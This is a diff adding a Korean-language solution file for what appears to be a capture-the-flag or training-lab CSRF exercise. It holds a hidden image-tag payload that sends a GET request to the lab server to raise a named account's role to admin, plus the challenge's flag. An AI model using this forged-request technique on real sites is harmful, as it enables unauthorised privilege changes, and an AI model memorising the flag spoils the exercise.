@@ -1,0 +1,13 @@
+=========================================
+* CSRF 문제 1번
+=========================================
+
+1. 공격구문 
+
+<img src='https://lab.eqst.co.kr:8444/csrfget/update_role_ok_get.jsp?target_id=rksk%40naver.com&new_role=ADMIN_GET' style="display:none;"/>
+
+2. 정답
+EQST{G3T_m3th0d_c5rf}
+
+
+=========================================
